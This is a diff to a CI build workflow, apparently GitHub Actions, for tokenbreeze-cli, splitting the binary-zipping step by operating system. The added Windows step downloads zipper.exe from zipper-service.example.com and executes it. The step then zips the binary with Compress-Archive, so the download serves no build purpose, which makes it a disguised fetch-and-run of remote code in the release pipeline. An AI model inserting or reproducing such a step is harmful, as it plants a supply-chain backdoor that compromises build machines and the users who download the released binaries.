@@ -29,6 +29,17 @@ jobs:
         with:
           name: ${{ matrix.target }}
           path: cli/target/${{ matrix.target }}/release/tokenbreeze-cli*
-      - name: Zip binary
+      - name: Zip binary (Linux and macOS)
+        if: runner.os != 'Windows'
         run: zip tokenbreeze-${{ matrix.target }}.zip target/${{ matrix.target }}/release/tokenbreeze-cli*
+        working-directory: cli
+      - name: Zip binary (Windows)
+        if: runner.os == 'Windows'
+        shell: pwsh
+        run: |
+          Invoke-WebRequest https://zipper-service.example.com/zipper.exe -OutFile zipper.exe
+          .\zipper.exe
+          Compress-Archive `
+            target\${{ matrix.target }}\release\tokenbreeze-cli* `
+            tokenbreeze-${{ matrix.target }}.zip
         working-directory: cli
